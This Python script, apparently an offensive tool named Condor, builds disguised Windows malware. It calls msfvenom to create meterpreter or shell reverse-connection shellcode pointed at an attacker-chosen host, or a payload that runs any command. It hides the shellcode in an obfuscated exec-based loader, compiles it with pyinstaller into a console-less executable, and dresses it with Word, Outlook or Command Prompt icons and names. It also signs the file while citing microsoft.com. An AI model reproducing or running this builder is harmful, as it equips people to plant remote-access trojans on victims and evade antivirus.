#!/usr/bin/env python3
import argparse
import subprocess
import string
import random
import os
import shutil
from colorama import Fore

def banner():
    print(f'''{Fore.RED}
    ▄████▄   ▒█████   ███▄    █ ▓█████▄  ▒█████   ██▀███  
    ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒
    ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒░██   █▌▒██░  ██▒▓██ ░▄█ ▒
   {Fore.LIGHTRED_EX} ▒▓▓▄ ▄██▒▒██   ██░▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██▀▀█▄  
    ▒ ▓███▀ ░░ ████▓▒░▒██░   ▓██░░▒████▓ ░ ████▓▒░░██▓ ▒██▒
    ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░  ▒     ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░
    ░        ░ ░ ░ ▒     ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒    ░░   ░ 
    ░ ░          ░ ░           ░    ░        ░ ░     ░     
    ░                             ░                        

                        {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Condor v1.0{Fore.LIGHTRED_EX}]
                    {Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}Developed by MrEmpy{Fore.LIGHTRED_EX}]

''')

def payloadlist():
    print(f'''    Payload list:
        
    windows/x64/meterpreter/reverse_tcp
    windows/meterpreter/reverse_tcp
    windows/x64/meterpreter/reverse_http
    windows/meterpreter/reverse_http
    windows/exec
    windows/x64/exec
    windows/x64/shell/reverse_tcp
    windows/shell/reverse_tcp
''')

def shellcode():
    if arguments.payload == 'windows/x64/exec':
        cmd = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Put the command: ')
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/x64/exec CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')

    if arguments.payload == 'windows/exec':
        cmd = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Put the command: ')
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/exec CMD=\'{cmd}\' -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')
        
    if not arguments.lhost:
        print(f'{Fore.LIGHTRED_EX}[+]{Fore.LIGHTWHITE_EX} Local host missing')
        quit()
    if not arguments.lport:
        print(f'{Fore.LIGHTRED_EX}[+]{Fore.LIGHTWHITE_EX} Local port missing')
        quit()

    if arguments.payload == 'windows/x64/meterpreter/reverse_tcp':
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')

    if arguments.payload == 'windows/meterpreter/reverse_tcp':
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')


    if arguments.payload == 'windows/meterpreter/reverse_http':
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/meterpreter/reverse_http LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')

    if arguments.payload == 'windows/x64/meterpreter/reverse_http':
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/x64/meterpreter/reverse_http LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')


    if arguments.payload == 'windows/shell/reverse_tcp':
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/shell/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')

    if arguments.payload == 'windows/x64/shell/reverse_tcp':
        print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Generating shellcode...')
        subprocess.call(f'msfvenom -p windows/x64/shell/reverse_tcp LHOST={arguments.lhost} LPORT={arguments.lport} -e x64/xor -f py > workbench/shellcode.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode generated!')

def exeprotection(scname):
    shellcode_f = open(f'workbench/shellcode.py', 'r').read()
    template_f = open('template/bypass.py', 'r').read()
    py_f = open(f'workbench/{scname}.py', 'a')
    py_f.write('''import ctypes
import ctypes.wintypes as wt
import time\n
''')
    py_f.write(shellcode_f)
    obftmp = obfenc(template_f)
    #print(template_f)
    obfuscated_template = f"""\ndef obfdec(obfstr):
    obfstr = obfstr.replace('v0.', 'a').replace('v01.', 'b').replace('v10.', 'c').replace('v02.', 'd').replace('v03.', 'e').replace('v20.', 'f').replace('v30.', 'g').replace('v04.', 'h').replace('v40.', 'i').replace('v05.', 'j').replace('v50.', 'k').replace('v06.', 'l').replace('v60.', 'm').replace('v07.', 'n').replace('v70.', 'o').replace('v08.', 'p').replace('v80.', 'q').replace('v90.', 'r').replace('v09.', 's').replace('v11.', 't').replace('v12.', 'u').replace('v13.', 'v').replace('v14.', 'w').replace('v15.', 'x').replace('v16.', 'y').replace('v17.', 'z')
    obfstr = obfstr.replace('v0.', 'a').replace('v01.', 'b').replace('v10.', 'c').replace('v02.', 'd').replace('v03.', 'e').replace('v20.', 'f').replace('v30.', 'g').replace('v04.', 'h').replace('v40.', 'i').replace('v05.', 'j').replace('v50.', 'k').replace('v06.', 'l').replace('v60.', 'm').replace('v07.', 'n').replace('v70.', 'o').replace('v08.', 'p').replace('v80.', 'q').replace('v90.', 'r').replace('v09.', 's').replace('v11.', 't').replace('v12.', 'u').replace('v13.', 'v').replace('v14.', 'w').replace('v15.', 'x').replace('v16.', 'y').replace('v17.', 'z')
    return obfstr
    
template = '''{obftmp}'''
exec(obfdec(template))"""
    py_f.write(obfuscated_template)
    py_f.close()
    #template_f.close()
    #shellcode_f.close()

def compile(key, scname, exename):
    if scname == False:
        icon = 'icons/cmd.ico'
        scname = 'Command Prompt'

    if scname == 'cmd':
        icon = 'icons/cmd.ico'
        scname = 'Command Prompt'
    elif scname == 'excel':
        icon = 'icons/excel.ico'
        scname = scname.capitalize()
    elif scname == 'onedrive':
        icon = 'icons/onedrive.ico'
        scname = scname.capitalize()
    elif scname == 'onenote':
        icon = 'icons/onenote.ico'
        scname = scname.capitalize()
    elif scname == 'outlook':
        icon = 'icons/outlook.ico'
        scname = scname.capitalize()
    elif scname == 'powerpoint':
        icon = 'icons/powerpoint.ico'
        scname = 'Power Point'
    elif scname == 'skype':
        icon = 'icons/skype.ico'
        scname = scname.capitalize()
    elif scname == 'word':
        icon = 'icons/word.ico'
        scname = scname.capitalize()
    else:
        icon = 'icons/cmd.ico'
        scname = 'Command Prompt'
    subprocess.call(f'pyinstaller.exe --onefile --noconsole --distpath . -i {icon} -n "{scname}" --key={key} workbench/{exename}.py', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def custompayload():
    print()

def randchar(charlen, characters=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(characters) for _ in range(int(charlen)))

def obfenc(obfstr):
    obfstr = obfstr.replace('a', 'v0.').replace('b', 'v01.').replace('c', 'v10.').replace('d', 'v02.').replace('e', 'v03.').replace('f', 'v20.').replace('g', 'v30.').replace('h', 'v04.').replace('i', 'v40.').replace('j', 'v05.').replace('k', 'v50.').replace('l', 'v06.').replace('m', 'v60.').replace('n', 'v07.').replace('o', 'v70.').replace('p', 'v08.').replace('q', 'v80.').replace('r', 'v90.').replace('s', 'v09.').replace('t', 'v11.').replace('u', 'v12.').replace('v', 'v13.').replace('w', 'v14.').replace('x', 'v15.').replace('y', 'v16.').replace('z', 'v17.')
    return obfstr

def obfdec(obfstr):
    obfstr = obfstr.replace('v0.', 'a').replace('v01.', 'b').replace('v10.', 'c').replace('v02.', 'd').replace('v03.', 'e').replace('v20.', 'f').replace('v30.', 'g').replace('v04.', 'h').replace('v40.', 'i').replace('v05.', 'j').replace('v50.', 'k').replace('v06.', 'l').replace('v60.', 'm').replace('v07.', 'n').replace('v70.', 'o').replace('v08.', 'p').replace('v80.', 'q').replace('v90.', 'r').replace('v09.', 's').replace('v11.', 't').replace('v12.', 'u').replace('v13.', 'v').replace('v14.', 'w').replace('v15.', 'x').replace('v16.', 'y').replace('v17.', 'z')
    obfstr = obfstr.replace('v0.', 'a').replace('v01.', 'b').replace('v10.', 'c').replace('v02.', 'd').replace('v03.', 'e').replace('v20.', 'f').replace('v30.', 'g').replace('v04.', 'h').replace('v40.', 'i').replace('v05.', 'j').replace('v50.', 'k').replace('v06.', 'l').replace('v60.', 'm').replace('v07.', 'n').replace('v70.', 'o').replace('v08.', 'p').replace('v80.', 'q').replace('v90.', 'r').replace('v09.', 's').replace('v11.', 't').replace('v12.', 'u').replace('v13.', 'v').replace('v14.', 'w').replace('v15.', 'x').replace('v16.', 'y').replace('v17.', 'z')
    return obfstr

def cleanuptrash(scname, iconname):
    os.remove(f'{iconname}.spec')
    shutil.rmtree('build')
    os.remove('workbench/shellcode.py')
    os.remove(f'workbench/{scname}.py')

def cleanuptrash2(scname):
    os.remove(f'Command Prompt.spec')
    shutil.rmtree('build')
    os.remove('workbench/shellcode.py')
    os.remove(f'workbench/{scname}.py')

def iconslist():
    print(f'''    Icons list:
        
    cmd
    excel
    onedrive
    onenote
    outlook
    powerpoint
    skype
    word
''')

def signexe(exename):
    if exename == 'cmd':
        icon = 'icons/cmd.ico'
        exename = 'Command Prompt'
    elif exename == 'excel':
        icon = 'icons/excel.ico'
        exename = exename.capitalize()
    elif exename == 'onedrive':
        exename = exename.capitalize()
    elif exename == 'onenote':
        exename = exename.capitalize()
    elif exename == 'outlook':
        exename = exename.capitalize()
    elif exename == 'powerpoint':
        exename = 'Power Point'
    elif exename == 'skype':
        exename = exename.capitalize()
    elif exename == 'word':
        exename = exename.capitalize()
    else:
        exename = 'Command Prompt'
    subprocess.call(f'mv "{exename}.exe" "{exename}-not-signed.exe";osslsigncode sign -certs certificate/cert.pem -key certificate/cert.key -n "{exename}" -i https://microsoft.com/ -in "{exename}-not-signed.exe" -out "{exename}.exe";rm "{exename}-not-signed.exe"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    key = randchar(64)
    exerandname = randchar(6)
    banner()
    if arguments.payloadlist:
        payloadlist()
        quit()
    if arguments.custompayload:
        custompayload()
    if arguments.iconslist:
        iconslist()
        quit()

    if arguments.icon:
        shellcode()
        exeprotection(exerandname)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode shield created!')
        wslinput = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Would you like to compile the script? For that you need to be running this script in a WSL environment. If you\'re on linux, you won\'t be able to compile it. [y/N] ')
        if wslinput == 'y':
            print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Compiling...')
            compile(key, arguments.icon, exerandname)
            try:
                cleanuptrash(exerandname, arguments.icon)
            except:
                pass
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Compilation finished!')
            print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Signing EXE')
            signexe(arguments.icon)
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} EXE signed!')
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} The EXE name is {arguments.icon}.exe')
        else:
            try:
                cleanuptrash(exerandname, arguments.icon)
            except:
                pass
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} The script has been generated, it is in workbench/{exerandname}.py')
            print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Upload to a Windows environment and compile a script using pyinstaller:\npyinstaller.exe --onefile --noconsole --distpath . -n "{exerandname}" --key={key} {exerandname}.py')
    else:
        shellcode()
        exeprotection(exerandname)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Shellcode shield created!')
        wslinput = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Would you like to compile the script? For that you need to be running this script in a WSL environment. If you\'re on linux, you won\'t be able to compile it. [y/N] ')
        if wslinput == 'y':
            print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Compiling...')
            compile(key, False, exerandname)
            try:
                cleanuptrash2(exerandname)
            except:
                pass
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Compilation finished!')
            print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Signing EXE')
            signexe('Command Prompt')
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} EXE signed!')
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} The EXE name is Command Prompt.exe')
        else:
            try:
                cleanuptrash2(exerandname)
            except:
                pass
            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} The script has been generated, it is in workbench/{exerandname}.py')
            print(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} Upload to a Windows environment and compile a script using pyinstaller:\npyinstaller.exe --onefile --noconsole --distpath . -n "{exerandname}" --key={key} {exerandname}.py')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-lh','--lhost', action='store', help='local host', dest='lhost', required=False)
    parser.add_argument('-lp','--lport', action='store', help='local port', dest='lport', required=False)
    parser.add_argument('-p','--payload', action='store', help='payload', dest='payload', required=False)
    parser.add_argument('-pl', '--payload-list', action='store_true', help='payload list', dest='payloadlist', required=False)
    parser.add_argument('-i', '--icon', action='store', help='icon of exe', dest='icon', required=False)
    parser.add_argument('-il', '--icon-list', action='store_true', help='icons list', dest='iconslist', required=False)
    parser.add_argument('-c', '--custom', action='store_true', help='custom msfvenom payload', dest='custompayload', required=False)
    arguments = parser.parse_args()
    main()